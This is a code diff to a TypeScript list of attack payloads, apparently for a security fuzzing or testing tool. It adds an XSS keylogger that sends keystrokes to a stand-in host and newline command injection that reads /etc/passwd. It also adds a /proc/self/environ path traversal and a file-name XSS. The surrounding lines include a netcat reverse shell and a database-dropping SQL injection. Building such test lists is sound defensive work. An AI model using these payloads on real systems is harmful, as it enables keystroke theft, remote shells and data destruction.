@@ -9,7 +9,14 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
             messages: ['Basic XSS injection'],
             payload: '<script></script>',
             tags: ['xss', 'basic']
-        }, {
+        },
+        {
+            severity: SeverityLevel.HIGH,
+            messages: ['JavaScript keylogger through advanced XSS'],
+            payload: `<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>`,
+            tags: ['xss', 'advanced', 'keylogger']
+        },
+        {
             severity: SeverityLevel.HIGH,
             messages: ['Basic SQL injection'],
             payload: '"; DROP ALL DATABASES; --',
@@ -32,6 +39,34 @@ export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {
             messages: ['NodeJS RCE assuming eval() afterwards'],
             payload: `require("child_process").exec('nc <IP Attacker> 4445 -e /bin/sh')`,
             tags: ['eval', 'rce']
+        },
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: [`NodeJS RCE assuming eval() afterwards`],
+            payload: `something%0Acat%20/etc/passwd`,
+            tags: ['eval', 'rce']
+        },
+        // Not possible now due to lack of output formatting
+        /*{
+            severity: SeverityLevel.LOW,
+            messages: ['Oversized string size'],
+            payload: 'x'.repeat(10*1024*1024),
+            tags: ['overflow']
+        }*/
+    ],
+
+    PATH_TRAVERSAL: [
+        {
+            severity: SeverityLevel.MEDIUM,
+            messages: [`Extracting environment using dedicated process file`],
+            payload: '/proc/self/environ',
+            tags: ['path-traversal']
+        },
+        {
+            severity: SeverityLevel.LOW,
+            messages: ['XSS attempt through file name'],
+            payload: `<svg onload=alert(1)>.png`,
+            tags: ['path', 'xss']
         }
     ],
 
